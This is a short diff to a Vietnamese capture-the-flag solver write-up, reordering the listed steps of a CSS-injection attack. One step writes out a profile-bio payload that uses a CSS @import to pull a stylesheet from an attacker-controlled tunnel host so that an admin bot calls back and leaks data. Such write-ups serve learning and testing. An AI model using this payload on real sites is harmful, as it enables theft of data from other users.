@@ -3586,8 +3586,8 @@ if __name__ == "__main__":
 
 **Khi chạy, solver sẽ:**
 
-1. Mở listener HTTP cục bộ trên `0.0.0.0:8000'
-2. Tạo nonce/token cho đường dẫn CSS và callback.
+1. Tạo nonce/token cho đường dẫn CSS và callback.
+2. Mở listener HTTP cục bộ trên `0.0.0.0:8000`
 3. Đăng ký một tài khoản ngẫu nhiên trên target.
 4. Đặt bio dạng `<div><style>@import url("https://<tunnel>/style/<token>.css")</style></div>`.
 5. Chờ bot tải CSS và gửi callback.
